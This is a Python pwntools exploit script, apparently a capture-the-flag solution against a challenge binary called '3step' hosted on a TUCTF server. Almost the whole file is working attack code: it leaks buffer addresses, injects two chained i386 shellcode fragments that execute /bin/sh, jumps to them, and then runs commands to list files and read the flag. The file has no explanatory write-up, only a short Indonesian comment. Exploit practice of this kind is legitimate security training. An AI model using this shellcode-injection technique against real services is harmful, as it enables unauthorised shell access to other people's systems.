from pwn import *
import sys

context.arch = 'i386'

def exploit(p):
    binary = ELF("3step")

    p.recvuntil("snacks\n")
    buff = int(p.recvline()[:-1], 16)
    buff1 = int(p.recvline()[:-1], 16)

    log.info("Buffer: {}".format(hex(buff)))
    log.info("Buffer 1: {}".format(hex(buff1)))

    shellcode1 = asm("""
    xor    eax, eax
    push   eax
    push   0x68732f2f
    push   0x6e69622f
    lea    esi, [ebp-28]
    call   esi
    """)

    shellcode2 = asm("""
    add    esp, 4
    mov    ebx, esp
    xor    ecx, ecx
    xor    edx, edx
    mov    al, 0xb
    int    0x80
    """)

    log.info("Length 1st shellcode: {}".format(len(shellcode1)))
    log.info("Length 2nd shellcode: {}".format(len(shellcode2)))

    p.sendafter("Step 1: ", shellcode1) # kalo sendafter gak nambah 1 byte di akhir, kalo sendline nambahin 1 byte di akhir
    p.sendlineafter("Step 2: ", shellcode2)

    # gdb.attach(p, 'brva *0x1338')

    p.sendlineafter("Step 3: ", p32(buff))

    sleep(1)
    p.sendline("ls -la && cat f*")
    p.interactive()

if __name__ == "__main__":
    if len(sys.argv) < 2:
        log.info("Argument needed!")
        log.info("Usage: python {} <local/remote>".format(sys.argv[0]))
        sys.exit(0)
    elif sys.argv[1] == "local":
        p = process("./3step")
        exploit(p)
    elif sys.argv[1] == "remote":
        p = remote("chal.tuctf.com", 30504)
        exploit(p)
    else:
        sys.exit(0)